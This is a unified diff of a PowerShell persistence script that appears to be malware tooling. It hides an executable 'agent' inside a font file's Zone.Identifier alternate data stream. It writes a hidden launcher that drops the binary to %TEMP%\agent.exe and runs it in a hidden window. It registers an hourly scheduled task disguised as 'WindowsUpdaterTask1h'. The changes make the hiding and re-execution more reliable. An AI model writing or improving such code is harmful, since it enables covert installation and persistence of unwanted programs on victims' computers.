@@ -1,5 +1,5 @@
 $ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'Continue'   # ← Changed from SilentlyContinue to see errors
+$ErrorActionPreference = 'Stop'   # Stop on any error for better debugging
 
 $agentPath = $env:AgentPath
 if (-not $agentPath -or -not (Test-Path $agentPath)) {
@@ -20,14 +20,18 @@ if (-not (Test-Path $fontFile)) {
 }
 
 $streamName = "Zone.Identifier"
-try {
-    $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-    Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -ErrorAction Stop
-    Write-Output "Agent written to ADS ($($agentBytes.Length) bytes)"
-} catch {
-    Write-Output "ERROR: Failed to write agent to ADS: $_"
-    exit 1
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+
+# Use native NTFS stream path syntax (more reliable than Set-Content -Stream)
+$streamPath = "$fontFile`:$streamName"
+[System.IO.File]::WriteAllBytes($streamPath, $agentBytes)
+
+# Verify the write succeeded
+if (-not (Test-Path $streamPath)) {
+    throw "ADS write failed – stream not created"
 }
+$actualSize = (Get-Item $streamPath).Length
+Write-Output "Agent written to ADS ($actualSize bytes)"
 
 # ---- 2. Launcher scripts ----
 $launcherPath = "$fontDir\run.ps1"
@@ -37,12 +41,9 @@ $launcherContent = @"
 `$streamName = '$streamName'
 `$tempAgent = "`$env:TEMP\agent.exe"
 if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
-`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
-if (`$bytes) {
-    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
-    `$env:AgentPath = `$tempAgent
-    Start-Process -WindowStyle Hidden -FilePath `$tempAgent
-}
+`$bytes = [System.IO.File]::ReadAllBytes(`"`$fontFile`:`$streamName`")
+[System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
+Start-Process -WindowStyle Hidden -FilePath `$tempAgent
 "@
 Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
@@ -58,7 +59,7 @@ attrib +h $vbsPath
 # ---- 3. Scheduled task: every 1 hour ----
 $taskName = "WindowsUpdaterTask1h"
 schtasks /delete /tn $taskName /f 2>$null
-schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it 2>$null
+schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
 if ($LASTEXITCODE -eq 0) {
     Write-Output "✅ Persistence installed (every 1 hour). Agent runs as %TEMP%\agent.exe"
     schtasks /run /tn $taskName 2>$null
